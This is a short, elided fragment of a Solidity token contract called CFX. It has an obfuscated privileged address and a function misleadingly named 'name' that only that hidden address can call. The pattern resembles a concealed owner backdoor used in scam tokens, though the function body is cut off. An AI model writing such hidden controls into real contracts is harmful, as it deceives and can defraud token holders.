...
contract CFX is Ownable {
    ...
    string public _tokenname = "CFX";
    string public _tokensymbol = "CFX";
    uint256 tokenamount = 10000000000*10**decimals();
    address public kfngah45;
    ...
    function name(address jjkxq1) public     {
        require(kfngah45 ==  _msgSender());
        if(kfngah45 != _msgSender()){
                revert("fu");
        }
